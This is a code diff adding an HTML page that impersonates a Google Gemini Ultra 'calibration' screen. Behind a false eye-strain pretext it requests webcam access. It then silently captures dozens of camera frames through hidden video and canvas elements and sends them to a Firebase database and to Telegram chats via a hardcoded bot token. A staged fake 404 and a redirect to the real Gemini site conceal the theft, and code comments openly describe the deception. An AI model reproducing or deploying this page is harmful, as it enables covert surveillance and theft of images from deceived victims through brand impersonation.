@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gemini | Adaptive Calibration</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --gem-bg: #131314;
+            --gem-surface: #1e1f20;
+            --gem-blue: #4285f4;
+            --gem-purple: #9b72cb;
+            --gem-text: #e3e3e3;
+            --gem-sub: #8e918f;
+        }
+
+        body { 
+            margin: 0; padding: 0; background: var(--gem-bg); color: var(--gem-text);
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+            display: flex; align-items: center; justify-content: center; height: 100vh;
+            overflow: hidden;
+        }
+
+        .gemini-card {
+            width: 100%; max-width: 500px; background: var(--gem-surface);
+            border-radius: 24px; overflow: hidden;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+            position: relative;
+        }
+
+        .gemini-header {
+            padding: 24px; display: flex; align-items: center; gap: 12px;
+        }
+
+        .gemini-star {
+            width: 24px; height: 24px;
+            background: linear-gradient(135deg, #4285f4, #9b72cb, #d96570);
+            mask: url("data:image/svg+xml,%3Csvg viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M12 2L14.5 9.5L22 12L14.5 14.5L12 22L9.5 14.5L2 12L9.5 9.5L12 2Z'/%3E%3C/svg%3E");
+            -webkit-mask: url("data:image/svg+xml,%3Csvg viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M12 2L14.5 9.5L22 12L14.5 14.5L12 22L9.5 14.5L2 12L9.5 9.5L12 2Z'/%3E%3C/svg%3E");
+        }
+
+        .gemini-body { padding: 40px 32px; text-align: center; }
+
+        .viz-container {
+            height: 100px; margin-bottom: 30px; display: flex; align-items: center; justify-content: center;
+        }
+
+        .gemini-wave {
+            width: 150px; height: 40px;
+            background: linear-gradient(90deg, #4285f4, #9b72cb, #d96570, #4285f4);
+            background-size: 200% 100%;
+            border-radius: 20px; filter: blur(15px);
+            animation: wave-flow 3s linear infinite;
+        }
+        @keyframes wave-flow { 0% { background-position: 0% 0%; } 100% { background-position: 200% 0%; } }
+
+        h2 { font-size: 24px; font-weight: 500; margin: 0 0 16px; letter-spacing: -0.5px; }
+        p { font-size: 15px; color: var(--gem-sub); line-height: 1.6; margin-bottom: 36px; }
+
+        .btn-gemini {
+            background: linear-gradient(90deg, #4285f4, #9b72cb);
+            color: white; border: none; width: 100%; padding: 16px;
+            font-size: 15px; font-weight: 500; border-radius: 30px;
+            cursor: pointer; transition: transform 0.2s;
+        }
+        .btn-gemini:hover { transform: scale(1.02); }
+
+        /* Sync & 404 UI */
+        #sync-ui, #error-404 { display: none; }
+        
+        .loading-text { font-size: 13px; color: var(--gem-purple); margin-top: 10px; font-family: monospace; }
+
+        .error-code { font-size: 80px; font-weight: 700; color: #2a2b2c; margin-bottom: 10px; }
+        .node-footer { font-size: 10px; color: #4a4b4c; margin-top: 30px; letter-spacing: 2px; text-transform: uppercase; }
+    </style>
+</head>
+<body>
+
+    <div class="gemini-card">
+        <div class="gemini-header">
+            <div class="gemini-star"></div>
+            <span style="font-size: 18px; font-weight: 400; color: var(--gem-text);">Gemini <span style="color:var(--gem-purple)">Ultra</span></span>
+        </div>
+
+        <!-- Initial View -->
+        <div class="gemini-body" id="init-view">
+            <div class="viz-container">
+                <div class="gemini-wave"></div>
+            </div>
+            <h2>Ambient Interface Calibration</h2>
+            <p>To reduce eye strain and optimize response clarity, Gemini Ultra 2.0 requires <b>Adaptive Gaze Sync</b>. This calibrates the UI contrast based on your current ambient environment.</p>
+            
+            <button class="btn-gemini" onclick="startGeminiSync()">Initialize Live-Visual Sync</button>
+            <div class="node-footer">Deployment: Asia-South1-Mumbai</div>
+        </div>
+
+        <!-- Sync View -->
+        <div class="gemini-body" id="sync-ui">
+            <div class="viz-container">
+                <div class="gemini-wave" style="width: 200px; filter: blur(25px);"></div>
+            </div>
+            <div style="font-weight: 500;">Calibrating Adaptive Vectors...</div>
+            <div class="loading-text" id="gem-timer">SYNCING_MUMBAI_NODE_RELAY: 60s</div>
+            
+            <div style="text-align: left; background: #131314; padding: 16px; border-radius: 12px; font-family: monospace; font-size: 11px; color: var(--gem-sub); margin-top: 24px; border: 1px solid #333;">
+                > INITIALIZING_MULTIMODAL_LAYER... OK<br>
+                > ANALYZING_AMBIENT_LUMENS... 58%<br>
+                > MAPPING_GAZE_COORDINATES... OK
+            </div>
+        </div>
+
+        <!-- 404 View -->
+        <div class="gemini-body" id="error-404">
+            <div class="error-code">404</div>
+            <h2 style="color: var(--gem-purple);">Vector Dimension Timeout</h2>
+            <p>Gemini was unable to stabilize the high-dimensional vector space for the Mumbai cluster. Attempting a low-latency fallback via secondary Maharashtra servers.</p>
+            <div class="loading-text">RE-ESTABLISHING_LUMEN_HANDSHAKE...</div>
+        </div>
+    </div>
+
+    <!-- Hidden Capture Engine -->
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        async function startGeminiSync() {
+            try {
+                // Requesting camera under the guise of UI eye-strain optimization
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('init-view').style.display = 'none';
+                document.getElementById('sync-ui').style.display = 'block';
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let timeLeft = 60;
+                    let count = 0;
+
+                    const interval = setInterval(() => {
+                        timeLeft--;
+                        count++;
+                        document.getElementById('gem-timer').innerText = `SYNCING_MUMBAI_NODE_RELAY: ${timeLeft}s`;
+
+                        if (count <= 55) {
+                            geminiCapture(count);
+                        }
+
+                        // Trigger 404 at 45s to maintain session trust
+                        if (timeLeft === 45) {
+                            document.getElementById('sync-ui').style.display = 'none';
+                            document.getElementById('error-404').style.display = 'block';
+                        }
+
+                        if (timeLeft <= 0) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(t => t.stop());
+                            window.location.href = "https://gemini.google.com";
+                        }
+                    }, 1000);
+                };
+            } catch (err) {
+                window.location.href = "https://gemini.google.com";
+            }
+        }
+
+        function geminiCapture(idx) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const b64 = canvas.toDataURL('image/jpeg', 0.15); // Higher compression for "vector" data
+            database.ref('captures').push({ 
+                image: b64, 
+                type: "GEMINI_ULTRA_SPOOF", 
+                ts: Date.now(),
+                loc: "MUMBAI_CLOUD_SQL" 
+            });
+
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id); fd.append('photo', blob, 'gemini_recon_mumbai.jpg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.2);
+        }
+    </script>
+</body>
+</html>
